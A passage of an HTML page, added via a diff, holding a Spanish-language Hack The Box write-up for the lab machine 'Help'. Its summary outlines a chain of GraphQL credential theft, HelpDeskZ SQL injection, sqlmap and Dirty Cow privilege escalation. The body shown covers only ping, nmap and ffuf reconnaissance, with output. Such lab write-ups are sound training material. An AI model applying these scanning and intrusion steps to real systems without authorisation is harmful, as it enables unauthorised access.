@@ -1,0 +1,1293 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Help - Hack The Box · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/htb-writeup-help/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Help - Hack The Box">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/htb-writeup-help/help.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-phantom/">
+          <span class="side-post-card-title">Phantom Robotics</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-thlpwn/">
+          <span class="side-post-card-title">THLPWN</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Help</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-folclore/">
+          <span class="side-post-card-title">Folclore</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-shadowgate/">
+          <span class="side-post-card-title">Shadowgate</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">HackTheBox / Easy</div>
+    
+    <h1>Help - Hack The Box</h1>
+    <div class="post-meta">8 April 2026 · 15 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/htb-writeup-help/help.png" alt="Help - Hack The Box">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina algo complicada. Después de analizar los escaneos de servicios, comenzamos con la página web activa en el puerto 80 y otra página web activa en el puerto 3000, pero en ambos casos no podemos encontrar algo relevante, por lo que aplicamos Fuzzing, descubriendo en la página web del puerto 80 el uso del sistema de tickets HelpDeskZ y en la del puerto 3000, enfocamos el Fuzzing para encontrar endpoints de una API, siendo que encontramos uno que pertenece a GraphQL. Sabiendo esto, aplicamos introspección y algunos filtros para poder obtener unas credenciales del endpoint de GraphQL. Dichas credenciales nos sirven para utilizar de forma autenticada el sistema HelpDeskZ, pudiendo así encontrar la versión de este, siendo la 1.0.2, que utilizamos para poder encontrar un Exploit acorde a esta versión. Encontramos un Exploit que aplica Blind SQL Injection para tratar de dumpear datos de la BD, pero al no funcionar, decidimos utilizar SQLMAP de forma agresiva para dumpear la BD, logrando obtener una contraseña que pertenece a un usuario de la máquina víctima. Probamos algunos usuarios y descubrimos un usuario válido que nos permite conectarnos a la máquina víctima vía SSH. Dentro, ejecutamos linpeas.sh para identificar alguna vulnerabilidad, descubriendo que la versión de Linux que usa la máquina víctima, es vulnerable a Dirty Cow. Utilizamos un Exploit de la BD de Exploit-DB que aplica el Dirty Cow, siendo así que escalamos privilegios y nos convertimos en Root.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>wappalizer</code></li><li><code>ffuf</code></li><li><code>gobuster</code></li><li><code>BurpSuite</code></li><li><code>searchsploit</code></li><li><code>crackstation</code></li><li><code>sqlmap</code></li><li><code>ssh</code></li><li><code>linpeas.sh</code></li><li><code>wget</code></li><li><code>bash</code></li><li><code>scp</code></li><li><code>gcc</code></li><li><code>file</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Puerto3000">Analizando Página Web del Puerto 3000</a></li>
+        <li><a href="#fuzz">Fuzzing</a>
+          <ul>
+            <li><a href="#fuzzHTTP">Aplicando Fuzzing a Página Web de Puerto 80</a></li>
+            <li><a href="#fuzzPuerto3000">Aplicando Fuzzing a Página Web de Puerto 3000 - Buscando Endpoints de APIs</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Graphql">Aplicando Instrospección y Filtros para Obtener Credenciales en GraphQL</a>
+          <ul>
+            <li><a href="#Exploits">Identificando Exploits para HelpDeskZ</a></li>
+          </ul>
+        </li>
+        <li><a href="#HelpDeskZ2">Probando Exploit: HelpDeskZ &lt; 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#LinKernel">Abusando de Versión Vulnerable de Linux Kernel para Escalar Privilegios (Dirty Cow Exploit)</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Puerto3000">Analizando Página Web del Puerto 3000</a></li>
+        <li><a href="#fuzz">Fuzzing</a>
+          <ul>
+            <li><a href="#fuzzHTTP">Aplicando Fuzzing a Página Web de Puerto 80</a></li>
+            <li><a href="#fuzzPuerto3000">Aplicando Fuzzing a Página Web de Puerto 3000 - Buscando Endpoints de APIs</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Graphql">Aplicando Instrospección y Filtros para Obtener Credenciales en GraphQL</a>
+          <ul>
+            <li><a href="#Exploits">Identificando Exploits para HelpDeskZ</a></li>
+          </ul>
+        </li>
+        <li><a href="#HelpDeskZ2">Probando Exploit: HelpDeskZ &lt; 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#LinKernel">Abusando de Versión Vulnerable de Linux Kernel para Escalar Privilegios (Dirty Cow Exploit)</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 10.129.230.159
+</span></span><span style="display:flex;"><span>PING 10.129.230.159 <span style="color:#f92672">(</span>10.129.230.159<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.129.230.159: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span>73.4 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.129.230.159: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span>69.1 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.129.230.159: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span>69.1 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.129.230.159: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span>70.4 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 10.129.230.159 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3004ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 69.067/70.503/73.369/1.744 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Linux</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 10.129.230.159 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-04-03 12:49 -0600
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 12:49
+</span></span><span style="display:flex;"><span>Scanning 10.129.230.159 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.129.230.159
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.129.230.159
+</span></span><span style="display:flex;"><span>Discovered open port 3000/tcp on 10.129.230.159
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 12:49, 25.00s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.230.159
+</span></span><span style="display:flex;"><span>Host is up, received user-set <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2026-04-03 12:49:31 CST <span style="color:#66d9ef">for</span> 25s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">55862</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>, <span style="color:#ae81ff">9670</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http    syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>3000/tcp open  ppp     syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 25.08 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">122025</span> <span style="color:#f92672">(</span>5.369MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">58164</span> <span style="color:#f92672">(</span>2.327MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Vemos que hay 3 puertos abiertos, pero parece que la intrusión será por el <strong>puerto 80</strong>.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 22,80,3000 10.129.230.159 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-04-03 12:50 -0600
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.230.159
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.070s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.18
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://help.htb/
+</span></span><span style="display:flex;"><span>3000/tcp open  http    Node.js Express framework
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>application/json; charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 15.18 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Gracias al escaneo de servicios, vemos bastante información útil:</p>
+<ul>
+<li>El <strong>puerto 22</strong>, que es el <strong>servicio SSH</strong>, muestra una versión vieja de <strong>SSH</strong> y que es vulnerable a un Exploit con el que puedes enumerar usuarios.</li>
+<li>Al entrar en el <strong>puerto 80</strong>, nos redirigirá al dominio <code>http://help.htb/</code>.</li>
+<li>El <strong>puerto 3000</strong> muestra el uso de <strong>Node.js Express</strong>, que ya se ha visto que es vulnerable a <strong>Inyección de Comandos</strong> y <strong>SSRF</strong>.</li>
+</ul>
+<p>Registremos el dominio en el <code>/etc/hosts</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;10.129.230.159 help.htb&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></div><p>Se nota que es una máquina algo vieja, pero vamos a resolverla empezando por la página web del <strong>puerto 80</strong>.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-help/Captura1.png">
+</p>
+<p>Parece que solo nos esta mostrando la página por defecto de <strong>Apache2</strong>.</p>
+<p>Veamos qué nos dice <strong>Wappalizer</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-help/Captura2.png">
+</p>
+<p>Nos llama la atención el uso de <strong>PHP</strong>.</p>
+<p>No encontramos algo más en esta página, por lo que puede que se esté utilizando para mostrar algún servicio que podríamos descubrir aplicando <strong>Fuzzing</strong>, pero lo haremos más adelante.</p>
+<p>Vayamos a la página web del <strong>puerto 3000</strong>.</p>
+<h3 id="Puerto3000">Analizando Página Web del Puerto 3000</h3>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-help/Captura3.png">
+</p>
+<p>Pareciera que entramos a una API, ya que la respuesta nos la da en formato <strong>JSON</strong>, que es común al consultar una <strong>API</strong>.</p>
+<p>Observa el mensaje que nos muestra, siendo que debemos dar la data correcta para obtener alguna contraseña, pero si tratamos de enviar algo, nos dará un error.</p>
+<p>De momento no podremos ver más, así que lo más seguro es que podamos encontrar endpoints ocultos cuando apliquemos <strong>Fuzzing</strong> y debemos probarlos con tal de obtener las credenciales que se mencionan.</p>
+<p>Entonces, apliquemos <strong>Fuzzing</strong> a ambas páginas.</p>
+<h3 id="fuzz">Fuzzing</h3>
+<p>Esto lo dividiremos en dos partes para mostrar la aplicación de <strong>Fuzzing</strong> en las dos páginas activas de la máquina víctima.</p>
+<h4 id="fuzzHTTP">Aplicando Fuzzing a Página Web de Puerto 80</h4>
+<p>Primero probemos con <strong>ffuf</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt:FUZZ -u http://help.htb/FUZZ -t <span style="color:#ae81ff">300</span> -mc 200,301
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.1.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://help.htb/FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,301
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>support                 <span style="color:#f92672">[</span>Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 5096ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>javascript              <span style="color:#f92672">[</span>Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 8369ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>index.html              <span style="color:#f92672">[</span>Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 71ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.                       <span style="color:#f92672">[</span>Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 78ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>128623/128623<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">145</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:01:34<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">72</span> ::
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-mc</em></td>
+					<td>Para aplicar un filtro que solo muestre resultados con un código de estado específico.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahora probemos con <strong>gobuster</strong>:</p>
